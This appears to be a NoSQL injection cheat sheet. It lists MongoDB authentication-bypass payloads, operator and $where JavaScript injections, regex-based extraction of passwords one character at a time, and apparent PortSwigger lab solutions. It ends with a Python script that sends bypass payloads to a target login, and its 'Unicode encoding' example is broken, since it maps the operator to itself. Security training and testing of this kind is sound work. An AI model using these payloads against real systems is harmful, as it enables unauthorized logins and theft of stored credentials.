# NoSQL Injection - Attack Techniques

## MongoDB Injection

### Authentication Bypass
```json
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### URL Parameter Injection
```
?username=admin&password[$ne]=wrong
?username=admin&password[$gt]=
?username[$regex]=.*&password[$ne]=
```

### Operator Injection
```json
{"$gt": ""}      # Greater than (always true)
{"$ne": ""}      # Not equal (always true)
{"$regex": ".*"} # Regex match (always true)
{"$exists": true} # Field exists
```

### Data Extraction via Regex
```json
# Extract username char by char
{"username": {"$regex": "^a"}, "password": {"$gt": ""}}
{"username": {"$regex": "^ad"}, "password": {"$gt": ""}}
{"username": {"$regex": "^adm"}, "password": {"$gt": ""}}
```

### Where Clause Injection
```javascript
// If server uses $where
'; return true; //
'; return this.username == 'admin' //
```

### Extract data with $where
```javascript
'; return this.password.startsWith('a') //
'; return this.password.length > 5 //
```

## PortSwigger Lab Solutions

### Lab: Detecting NoSQL injection
**Test**: Send `{"$gt": ""}` - if different response, injection exists

### Lab: Exploiting NoSQL operator injection to bypass authentication
**Payload**: 
```
POST /login
{"username": "admin", "password": {"$ne": ""}}
```

### Lab: Exploiting NoSQL injection to extract data
**Steps**:
1. Find injectable parameter
2. Use regex to extract password char by char
3. Iterate: `^a`, `^ab`, `^abc`...

### Lab: Exploiting NoSQL injection with aggregate functions
**Payload**:
```
POST /login
{"username": "admin", "password": {"$gt": undefined}}
```

## Detection Script
```python
import requests
import json

target = "https://TARGET/login"

# Test for NoSQL injection
payloads = [
    {"username": "admin", "password": {"$ne": ""}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
]

for payload in payloads:
    r = requests.post(target, json=payload)
    if r.status_code == 200 and "success" in r.text.lower():
        print(f"[!] VULNERABLE: {json.dumps(payload)}")
```

## Bypass Techniques

### JSON syntax variations
```
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$in": ["admin"]}, "password": {"$gt": ""}}
```

### Comment injection
```
// MongoDB comments
{"username": "admin", "password": {"$ne": ""} // comment}
```

### Unicode encoding
```
# Use unicode for operators
{"$gt": ""} → {"$gt": ""}
```
